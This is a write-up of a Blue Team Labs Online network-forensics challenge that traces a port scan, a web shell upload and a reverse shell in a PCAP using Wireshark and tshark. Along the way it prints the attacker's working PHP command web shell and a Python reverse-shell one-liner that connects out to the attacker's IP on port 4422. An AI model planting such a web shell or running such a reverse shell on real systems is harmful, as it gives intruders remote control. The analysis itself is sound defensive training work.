---
title: "Network Analysis - Web Shell"
categories: ["IT and Cyber Security"]
tags: ['Blue Team Labs Online']
date: 2021-09-06
---

[https://blueteamlabs.online/home/challenge/12](https://blueteamlabs.online/home/challenge/12)

## Contents

- [Introduction](#introduction)
- [Questions](#questions)
  - [What is the IP responsible for conducting the port scan activity?](#what-is-the-ip-responsible-for-conducting-the-port-scan-activity)
  - [What is the port range scanned by the suspicious host?](#what-is-the-port-range-scanned-by-the-suspicious-host)
  - [What is the type of port scan conducted?](#what-is-the-type-of-port-scan-conducted)
  - [Two more tools were used to perform reconnaissance against open ports, what were they?](#two-more-tools-were-used-to-perform-reconnaissance-against-open-ports-what-were-they)
  - [What is the name of the php file through which the attacker uploaded a web shell?](#what-is-the-name-of-the-php-file-through-which-the-attacker-uploaded-a-web-shell)
  - [What is the name of the web shell that the attacker uploaded?](#what-is-the-name-of-the-web-shell-that-the-attacker-uploaded)
  - [What is the parameter used in the web shell for executing commands?](#what-is-the-parameter-used-in-the-web-shell-for-executing-commands)
  - [What is the first command executed by the attacker?](#what-is-the-first-command-executed-by-the-attacker)
  - [What is the type of shell connection the attacker obtains through command execution?](#what-is-the-type-of-shell-connection-the-attacker-obtains-through-command-execution)
  - [What is the port he uses for the shell connection?](#what-is-the-port-he-uses-for-the-shell-connection)
- [Comments?](#comments)

## Introduction

The SOC received an alert in their SIEM for ‘Local to Local Port Scanning’ where an internal private IP began scanning another internal system. Can you investigate and determine if this activity is malicious or not? You have been provided a PCAP, investigate using any tools you wish.

## Questions

### What is the IP responsible for conducting the port scan activity?

Having a quick look down the packets, there are a huge number of grey and red lines (this is determined by Wireshark in Coloring Rules... in the View menu). These are `SYN` and `RST, ACK` packets . For a normal connection there would be `SYN, ACK` and `ACK` too, but these don't.

We can filter just for these:

`tcp.flags==0x002 || tcp.flags==0x014`

(I found these codes by looking within the Packet Details box, under Transmission Control Protocol, then Flags)

The `SYN` packets are all from `10.251.96.4` to `10.251.96.5`, and the `RST, ACK` in the reverse direction.

So `10.251.96.4` is doing the scanning.

### What is the port range scanned by the suspicious host?

Let's filter just for these scan packets:

`ip.src==10.251.96.4 && tcp.flags==0x002`

This gives us the scan (grey lines), then some green lines. These are for TCP port 80 and presumably the connection(s) made after the scan was complete.

Select a packet and in the Packet Details box, expand Transmission Control Protocol, right click on Destination Port, then Apply as Column. Then, if you click this new column, it will sort by DPort.

The first one is 1, and the last is 1024.

### What is the type of port scan conducted?

This scan is sending `SYN` packets, but not finalising the connection (i.e. no three-way handshake). This is typical of a TCP SYN scan.

### Two more tools were used to perform reconnaissance against open ports, what were they?

While this can be done in Wireshark, Tshark (the command-line version is actually easier). I did it in Linux as Terminal is often superior than Command Prompt and PowerShell for data manipulation.

A good way to find tools is to check the User Agents. Of course there are Chrome and Firefox etc, but tools such as nmap will often state what they are.

```bash
$ tshark -r BTLOPortScan.pcap -T fields -e http.user_agent | sort | uniq -c
  12617
      3 Apache/2.4.29 (Ubuntu) (internal dummy connection)
     94 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36
     32 Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
   4615 gobuster/3.0.1
    147 sqlmap/1.4.7#stable (http://sqlmap.org)
```

First tshark reads (`-r`) the file. The `T` tells it what to filter by, in this case `fields`, and the `-e` tells it which `fields` - in this case, `http.user_agent`. Next, pipe to Terminal commands `| sort | uniq -c`.

Note if you search `http.user_agent` in Wireshark, it would display all packets with this field present - but that doesn't make extracting that data easier. Tshark and Wireshark use the same field names e.g. `tcp.flags`, `ip.src`.

Looking at the output, there are two well-known recon tools that stand out: `Gobuster 3.0.1` and `sqlmap 1.4.7`.

### What is the name of the php file through which the attacker uploaded a web shell?

An upload would be done through a POST request, which we can filter for:

`http.request.method==POST`

We get a lot of `HTML Form URL Encoded: application/x-www-form-urlencoded`, which we can see are brute forces by sqlmap. Let's filter these out by right-clicking the User-Agent section (Packet Details → Hypertext Transfer Protocol) then Apply as Filter → ...and not Selected. This gives us the following filter:

`(http.request.method==POST) && !(http.user_agent == "sqlmap/1.4.7#stable (http://sqlmap.org)")`

Now we have only four packets! Two for `login.php` and two for `upload.php`.

Initially I thought `upload.php` was the answer, but I had to look a bit deeper.

What we actually need is the referer. This is also found within Hypertext Transfer Protocol within Packet Details. This gives us:

`Referer: http://10.251.96.5/editprofile.php\\r\\n`

So, `editprofile.php` uses `upload.php` to upload things. Makes sense.

### What is the name of the web shell that the attacker uploaded?

The files uploaded via `upload.php` are found within the `MIME` section within the Packet Details. Specifically, we're looking for `Content-Disposition` (or, put another way, anything that includes a filename!)

The two files are:

`myphoto.png`

`dbfunctions.php`

It's more likely a web shell is php than png.

Let's see how the php file was used. A simple, broad search is:

`frame contains dbfunctions.php`

Yeah, some of that looks like web shell activity! For comparison, the same search for `myphoto.png` gives nothing except the actual upload.

### What is the parameter used in the web shell for executing commands?

The previous `frame contains` search shows it was used three times (in the pcap at least):

- `Request URI: /uploads/dbfunctions.php?cmd=id`
- `Request URI: /uploads/dbfunctions.php?cmd=whoami`
- `Request URI: /uploads/dbfunctions.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.251.96.4%22,4422));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27`

`cmd` it is.

Alternatively, we can see the content of the web shell itself, as it was uploaded over HTTP (i.e. unencrypted). If we follow the stream (right click the `POST /upload.php HTTP/1.1 (application/x-php)` packet, then Follow → TCP Stream), we can see the web shell consists of:

```php
<?php
if(isset($_REQUEST['cmd']) ){
echo "<pre>";
$cmd = ($_REQUEST['cmd']);
system($cmd);
echo "</pre>";
die;
}
?>
```

A nice, simple, `cmd`-based backdoor.

### What is the first command executed by the attacker?

We already have this from above - `id`.

### What is the type of shell connection the attacker obtains through command execution?

There are two common types of shell, reverse shell and bind shell.

A bind shell is when the attacker connects to the target (the target is configured to listen for an incoming connection).

A reverse shell is when the target connects to the attacker.

In this case, the shell relates to the `python` command. Putting it through CyberChef to URL decode it, then formatting it so it's easier to read, we get:

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.251.96.4",4422))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

You'll need to know a little about Python and shells to fully understand this, but this is a reverse shell, that reaches out to (i.e. `connect`s to) `10.251.96.4` (i.e. the attacker's machine) on port `4422`.

The pcap logs also show traffic initiated by the target machine going to `10.251.96.4:4422`.

### What is the port he uses for the shell connection?

Again, we already have this from the previous question - `4422`.

## Comments?

Feel free to comment on my [LinkedIn post](https://www.linkedin.com/posts/jamgib_btlo-challenge-network-analysis-web-activity-6840569024884146176-Lpvq)